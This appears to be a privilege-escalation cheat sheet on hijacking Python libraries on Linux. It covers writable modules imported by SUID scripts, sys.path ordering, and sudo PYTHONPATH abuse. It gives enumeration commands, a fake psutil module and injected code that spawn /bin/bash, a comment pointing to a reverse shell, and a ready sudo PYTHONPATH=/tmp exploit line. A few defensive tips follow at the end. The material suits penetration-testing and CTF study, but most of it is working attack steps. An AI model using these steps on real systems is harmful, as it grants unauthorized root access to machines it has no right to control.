üêç Python Library Hijacking Techniques
|__Technique______________________|__Requirements____________________________________________________________________|__Exploitation Steps______________________________________________________________________________________________|
| Wrong Write Permissions         | - SUID/SGID Python script that imports a module                                 | 1. Locate the SUID script and its imported module                                                                |
|                                 | - Writable permission on the actual Python module                               | 2. Check if module is writable                                                                                   |
|                                 |                                                                                  | 3. Inject malicious code                                                                                          |
|                                 |                                                                                  | 4. Run the script with elevated privileges                                                                        |
|---------------------------------|----------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------|
| Library Path Hijacking          | - Writable directory above the original module path in sys.path                 | 1. Check sys.path using: python3 -c 'import sys; print(sys.path)'                                                |
|                                 | - Knowledge of module and function name                                         | 2. Find writable directory higher in list                                                                         |
|                                 |                                                                                  | 3. Create malicious module with same name and function                                                            |
|                                 |                                                                                  | 4. Run the SUID script                                                                                            |
|---------------------------------|----------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------|
| PYTHONPATH Variable Abuse       | - sudo permission with SETENV for /usr/bin/python3                              | 1. Create malicious module in a controlled directory (e.g. /tmp/psutil.py)                                        |
|                                 | - Ability to define PYTHONPATH during execution                                 | 2. Run: sudo PYTHONPATH=/tmp /usr/bin/python3 ./script.py                                                        |
|                                 |                                                                                  | 3. Get elevated execution                                                                                         |
|_________________________________|__________________________________________________________________________________|___________________________________________________________________________________________________________________|


üß™ Summary of Techniques
üõ† 1. Wrong Write Permissions
Scenario: A script with SUID runs a library that is world-writable.
Goal: Inject code into the existing library function (e.g. virtual_memory()).
Example:
      ls -l mem_status.py
      grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
      ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
Exploit Code:

import os
      os.system('/bin/bash')  # or reverse shell


üõ† 2. Library Path Hijacking
Scenario: sys.path includes a writable path before the real module path.
Goal: Inject a fake module with the same name and function.
Check:
      python3 -c 'import sys; print("\n".join(sys.path))'

Exploit Code:
      # /usr/lib/python3.8/psutil.py
      import os
      def virtual_memory():
          os.system('/bin/bash')

üõ† 3. PYTHONPATH Environment Variable Abuse
Scenario: You have sudo SETENV rights to run Python.
Goal: Set PYTHONPATH to force Python to load modules from attacker-controlled path.
Check:
      sudo -l  # Check for: SETENV: NOPASSWD: /usr/bin/python3

Exploit:
      sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

‚úÖ Best Practices (Defensive Notes)
Never allow global write (-rw-rw-rw-) on production libraries.
Avoid using SUID with interpreted scripts like Python.
Validate PYTHONPATH control using secure sudo configurations.
Regularly audit file permissions and sys.path.
